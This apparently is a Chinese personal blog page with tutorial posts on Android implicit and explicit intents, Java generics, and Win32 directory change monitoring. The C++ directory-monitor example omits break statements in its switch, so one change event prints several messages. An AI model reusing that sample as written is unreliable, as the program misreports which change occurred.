        <h1 id="隐示Intent"><a href="#隐示Intent" class="headerlink" title="隐示Intent"></a>隐示Intent</h1><p>这个东西是个好东西，主要是用来增加打开方式的，这个和Windows有点区别，windows打开方式的设定是写注册表项，而这个的话呢是来设置我们Activity的一个过滤器就可以达到这个效果，具体看下面操作：</p>
<h2 id="设置AndroidManifest-xml"><a href="#设置AndroidManifest-xml" class="headerlink" title="设置AndroidManifest.xml"></a>设置AndroidManifest.xml</h2><p>首先我们增加一个filter，具体看下面代码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".activity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个首先定义我们的action名称，这个可以自定义，有点类似于一个索引。category的值这里我们限制为这个默认的值，设置好之后，我们加一个按钮事件，通过这个Intent-filter打开这个Activity。</p>
<h2 id="增加打开事件"><a href="#增加打开事件" class="headerlink" title="增加打开事件"></a>增加打开事件</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.wker.top"</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>还是先new一个intent，然后设置一下Action的值，然后增加一个category（这里可以看到我们的category是add上去的，所以应该是可以添加多个），然后启动这个intent，这里的效果和我们普通的意图（intent）是一样的，那么我们用这个有什么好处呢？下面我们增加一个新的工程，然后在他的AndroidManifest.xml。</p>
<h2 id="打开方式"><a href="#打开方式" class="headerlink" title="打开方式"></a>打开方式</h2><p>我们将我们上面的intent-filter设置的内容复制到那个activity项目中，例如下面：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:name</span>=<span class="string">".MainActivity"</span></span></span><br><span class="line"><span class="tag">           </span></span><br><span class="line"><span class="tag">           <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> &gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>intent-filter多次设定应该是没啥事情，看来可以设置多个，然后部署到我们的安卓手机上，然后我们再次打开刚才的程序进行测试，你的程序将会看到入下的效果：<br><img src="img1.jpg" alt="打开方式设置"><br>这个就是打开方式的一个设置，也是很简单的，我们随便打开一个，就会跳到那个activity上，具体怎么传送数据，我们之后再讨论。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/23/Intent-Open-Activity3/" data-id="ck5xij357000re0wjbex312vr" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Java-泛型" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/21/Java-%E6%B3%9B%E5%9E%8B/" class="article-date">
  <time datetime="2020-01-21T07:24:34.000Z" itemprop="datePublished">2020-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/21/Java-%E6%B3%9B%E5%9E%8B/">Java 泛型</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Java泛型"><a href="#Java泛型" class="headerlink" title="Java泛型"></a>Java泛型</h1><p>官方解释：</p>
<ol>
<li>第一是泛化。可以用T代表任意类型Java语言中引入泛型是一个较大的功能增强不仅语言、类型系统和编译器有了较大的变化，以支持泛型，而且类库也进行了大翻修，所以许多重要的类，比如集合框架，都已经成为泛型化的了，这带来了很多好处。</li>
<li>第二是类型安全。泛型的一个主要目标就是提高ava程序的类型安全，使用泛型可以使编译器知道变量的类型限制，进而可以在更高程度上验证类型假设。如果不用泛型，则必须使用强制类型转换，而强制类型转换不安全，在运行期可能发生ClassCast Exception异常，如果使用泛型，则会在编译期就能发现该错误。</li>
<li>第三是消除强制类型转换。泛型可以消除源代码中的许多强制类型转换，这样可以使代码更加可读，并减少出错的机会。</li>
<li>第四是向后兼容。支持泛型的Java编译器（例如JDK1.5中的Javac）可以用来编译经过泛型扩充的Java程序（Generics Java程序），但是现有的没有使用泛型扩充的Java程序仍然可以用这些编译器来编译。</li>
</ol>
<p>这个东西感觉上有点类似于C++的模板和<code>static_cast</code>这种静态转换，从其他的地方借鉴来的一些知识（部分知识来自于博客：<a href="https://blog.csdn.net/s10461/article/details/53941091" target="_blank" rel="noopener" title="Java泛型">https://blog.csdn.net/s10461/article/details/53941091</a>）</p>
<h2 id="避免编译报错"><a href="#避免编译报错" class="headerlink" title="避免编译报错"></a>避免编译报错</h2><p>在我们使用容器的时候，由于ArrayList可以接受任何类型，所以导致我们有时会出现一些异常，下面是一个比较典型的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">		arrayList.add(<span class="string">"aaaa"</span>);</span><br><span class="line">		arrayList.add(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; arrayList.size();i++)&#123;</span><br><span class="line">		    String item = (String)arrayList.get(i);</span><br><span class="line">		    System.out.println(<span class="string">"泛型测试"</span>+<span class="string">"item = "</span> + item);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行的时候会出现如下异常：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String</span><br><span class="line">	at Test.main(Test.java:<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<p>意思就是说Int不能到String，这个时候就是在编译的时候不会报错，但是运行的时候确实会出现错误，那么我们如何更改比较好呢？<br>我们可以这样：<br><img src="img1.jpg" alt="编译报错"><br>这个样子就比较好处理了，这个就类似于：<code>static_cast</code>，比较安全。</p>
<h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><p>这个听名字就和模板很像了，其实感觉起来就是那么一回事，简单地说就是参数化，我们给他一个String，里面的内容就是跟String有关的，那么具体怎么实现呢？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi&lt;String&gt; sCeshi = <span class="keyword">new</span> ceshi&lt;String&gt;();</span><br><span class="line">		ceshi&lt;Integer&gt; iCeshi = <span class="keyword">new</span> ceshi&lt;Integer&gt;();</span><br><span class="line">		sCeshi.SetKey(<span class="string">"123"</span>);</span><br><span class="line">		iCeshi.SetKey(<span class="number">123</span>);</span><br><span class="line">		System.out.println(sCeshi.GetKey());</span><br><span class="line">		System.out.println(iCeshi.GetKey());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span>&lt;<span class="title">W</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> W key;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> W <span class="title">GetKey</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> key;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetKey</span><span class="params">(W key)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.key = key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="img2.jpg" alt="正确示范"><br>注意！不能对确切的泛型类型使用<code>instanceof</code>操作。如下面的操作是非法的，编译时会出错。<br><code>instanceof</code>就是查看是什么类，主要用在多态。</p>
<h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>这个和上面类似，也就是定义的时候需要注意加上&lt;&gt;就可以了。<br><code>implements Test&lt;String&gt;</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">ceshi</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型通配符"><a href="#泛型通配符" class="headerlink" title="泛型通配符"></a>泛型通配符</h2><p>这个东西主要是为了我们的方法做准备，有的时候需要传入一个泛型参数，但是什么填充类型呢？<br>我们可以用<code>?</code>进行填充，看下面示例代码就很容易明白了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi&lt;String&gt; sCeshi = <span class="keyword">new</span> ceshi&lt;String&gt;();</span><br><span class="line">		ceshi&lt;Integer&gt; iCeshi = <span class="keyword">new</span> ceshi&lt;Integer&gt;();</span><br><span class="line">		sCeshi.SetKey(<span class="string">"123"</span>);</span><br><span class="line">		iCeshi.SetKey(<span class="number">123</span>);</span><br><span class="line">		Print(sCeshi);</span><br><span class="line">		Print(iCeshi);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Print</span><span class="params">(ceshi&lt;?&gt; T)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		System.out.println(T.GetKey());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span>&lt;<span class="title">W</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> W key;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> W <span class="title">GetKey</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> key;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetKey</span><span class="params">(W key)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.key = key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先写这么多吧，下篇文章继续写！！！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/21/Java-%E6%B3%9B%E5%9E%8B/" data-id="ck5xij35f000ze0wj0ofx1pfq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Intent-Open-Activity2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/21/Intent-Open-Activity2/" class="article-date">
  <time datetime="2020-01-21T06:48:50.000Z" itemprop="datePublished">2020-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/21/Intent-Open-Activity2/">Intent Open Activity2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Intent打开Activity的其他显示调用"><a href="#Intent打开Activity的其他显示调用" class="headerlink" title="Intent打开Activity的其他显示调用"></a>Intent打开Activity的其他显示调用</h1><p>一. 通过全类名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent inten1 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten1.setClassName(<span class="keyword">this</span>, <span class="string">"com.example.lx.activity"</span>);</span><br><span class="line">startActivity(inten1);</span><br></pre></td></tr></table></figure>
<p>二.通过包名和全类名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent inten2 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten2.setClassName(<span class="string">"com.example.test"</span>, <span class="string">"com.example.test.st"</span>);<span class="comment">//支持调用其他的应用程序</span></span><br><span class="line">startActivity(inten2);</span><br></pre></td></tr></table></figure>
<p>注意我的注释，可以打开其他的应用程序，意思就是远程打开另外APP的Activity，但在这我们需要注意，包名是包名，全类名要填写打开的Activity的全类名，但是有一点要注意，如果我们打开的是主界面那倒是无所谓，但是如果我们打开的不是主界面，那么我们就需要注意了，我们需要在配置我们的Activity属性的时候加上这么一句话：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".st"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到有一个exported的属性，这个就是是否允许远程调用，默认是false。<br>三.通过Component</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent inten1 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten1.setClassName(<span class="keyword">this</span>, <span class="string">"com.example.lx.activity"</span>);</span><br><span class="line">inten1.setComponent(<span class="keyword">new</span> ComponentName(<span class="keyword">this</span>,activity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">startActivity(inten1);</span><br></pre></td></tr></table></figure>
<p>new一个就可以了</p>
<h2 id="安卓Listener"><a href="#安卓Listener" class="headerlink" title="安卓Listener"></a>安卓Listener</h2><p>一点小补充，我们如果偏要设置监听时候要用this，习惯win32的话呢我们需要将我们的类接上类似于：<code>OnClickListener</code>这个样子的一个借口，然后完成：<code>public void onClick(View v)</code>这个函数，<code>v.getId()</code>可以获得事件源，在R文件中的定义对比，建议还是用switch进行判断。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/21/Intent-Open-Activity2/" data-id="ck5xij355000pe0wj3l6y53pj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="w-Dir-Monitor" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/21/Dir-Monitor/" class="article-date">
  <time datetime="2020-01-21T04:42:05.000Z" itemprop="datePublished">2020-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/21/Dir-Monitor/">Dir Monitor</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="目录监视功能"><a href="#目录监视功能" class="headerlink" title="目录监视功能"></a>目录监视功能</h1><p>这个实现的效果有很多办法，比如说Hook，但是这个的话呢相对而言有点小麻烦，但是灵活性比较好，但当我们要求比较低，只是想单纯的监视的时候（对更改的内容和文件名之类不感兴趣的时候），我们可以考虑<code>FindFirstChangeNotification</code>这个相关的函数。</p>
<h2 id="FindFirstChangeNotification"><a href="#FindFirstChangeNotification" class="headerlink" title="FindFirstChangeNotification"></a><code>FindFirstChangeNotification</code></h2><p>这个函数是队目录监控的一个函数，具体微软怎么实现的不知道（感觉应该也跟钩子有关系），这个函数调用比较简单，共有下面三个参数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">FindFirstChangeNotification</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpPathName,    <span class="comment">// pointer to name of directory to watch</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bWatchSubtree,    <span class="comment">// flag for monitoring directory or </span></span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// directory tree</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNotifyFilter   <span class="comment">// filter conditions to watch for</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>lpPathName：监视的目录文件夹</li>
<li>bWatchSubtree ：是否监视子目录</li>
<li>dwNotifyFilter：监视的类型</li>
</ol>
<ul>
<li>FILE_NOTIFY_CHANGE_FILE_NAME</li>
<li>FILE_NOTIFY_CHANGE_DIR_NAME</li>
<li>FILE_NOTIFY_CHANGE_ATTRIBUTES</li>
<li>FILE_NOTIFY_CHANGE_SIZE</li>
<li>FILE_NOTIFY_CHANGE_LAST_WRITE</li>
<li>FILE_NOTIFY_CHANGE_SECURITY<br>看名字就能看明白了。<br>返回值是一个句柄，这个句柄可以通过等待进行相应，这也就是下面我将要说到的一个函数。和这个相关的是：<code>FindNextChangeNotification</code>, <code>FindCloseChangeNotification</code>这个在最后提。<h2 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a><code>WaitForMultipleObjects</code></h2>这个函数有点类似于：<code>WaitForSingleObject</code>，但是这个我们是支持单个对象的，但对于多对象的我们就需要用到<code>WaitForMultipleObjects</code>，看下MSDN给出的定义：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD nCount,             <span class="comment">// number of handles in the handle array</span></span></span></span><br><span class="line"><span class="function"><span class="params">	CONST HANDLE *lpHandles,  <span class="comment">// pointer to the object-handle array</span></span></span></span><br><span class="line"><span class="function"><span class="params">	BOOL fWaitAll,            <span class="comment">// wait flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwMilliseconds      <span class="comment">// time-out interval in milliseconds);</span></span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>nCount：等待的个数</li>
<li>lpHandles：等待时间句柄的数组</li>
<li>fWaitAll：是否等待所有时间都相应</li>
<li>dwMilliseconds：等待的时间</li>
</ol>
<p>dwMilliseconds这个参数如果我们提供：INFINITE 这个的话呢将视为无线等待（一般就填写这个就比较好）。<br>返回值：<br>WAIT_OBJECT_0 to (WAIT_OBJECT_0 + nCount – 1)：If bWaitAll is TRUE, the return value indicates that the state of all specified objects is signaled.<br>If bWaitAll is FALSE, the return value minus WAIT_OBJECT_0 indicates the lpHandles array index of the object that satisfied the wait. If more than one object became signalled during the call, this is the array index of the signalled object with the smallest index value of all the signalled objects.</p>
<p>WAIT_ABANDONED_0 to (WAIT_ABANDONED_0 + nCount – 1)：If bWaitAll is TRUE, the return value indicates that the state of all specified objects is signaled and at least one of the objects is an abandoned mutex object.<br>If bWaitAll is FALSE, the return value minus WAIT_ABANDONED_0 indicates the lpHandles array index of an abandoned mutex object that satisfied the wait.</p>
<p>WAIT_TIMEOUT：The time-out interval elapsed and the conditions specified by the bWaitAll parameter are not satisfied. </p>
<p>是不是有点眼花缭乱，我翻译一下吧：</p>
<p>如果bWaitAll为真，则返回值表示所有指定对象的状态都有信号。如果bWaitAll为FALSE，则返回值减去WAIT_OBJECT_0表示满足等待的对象的lpHandles数组索引。如果在调用期间有多个对象被标记，这是标记对象的数组索引，索引值是所有标记对象的最小值。如果bWaitAll为真，则返回值表明所有指定对象的状态都有信号，并且至少有一个对象是废弃的互斥对象。如果bWaitAll为FALSE，则返回值减去wait_oned_0表示满足等待的废弃互斥对象的lpHandles数组索引。超时时间间隔和bWaitAll参数指定的条件不满足。</p>
<p>简单地说我们如果是无限等待返回给我们的值-WAIT_OBJECT_0就是我们提供的对象句柄的数组的下标值。</p>
<h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE m_charnge[<span class="number">3</span>];</span><br><span class="line">	m_charnge[<span class="number">0</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_FILE_NAME);</span><br><span class="line">	m_charnge[<span class="number">1</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_DIR_NAME);</span><br><span class="line">	m_charnge[<span class="number">2</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_LAST_WRITE);	</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD Rv = WaitForMultipleObjects(<span class="number">3</span>,m_charnge,FALSE,INFINITE);</span><br><span class="line">		<span class="keyword">switch</span>(Rv-WAIT_OBJECT_0)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"文件名改變"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"目錄改變"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"內容改變"</span>&lt;&lt;<span class="built_in">endl</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">		FindNextChangeNotification(m_charnge[Rv]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意的是在填写监视目录的时候别忘记转义，其他的都好说。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/21/Dir-Monitor/" data-id="ck5xij34p0008e0wj74kp4r9d" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-C-friend-fun" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/21/C-friend-fun/" class="article-date">
  <time datetime="2020-01-21T00:46:42.000Z" itemprop="datePublished">2020-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/21/C-friend-fun/">C++ friend fun</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
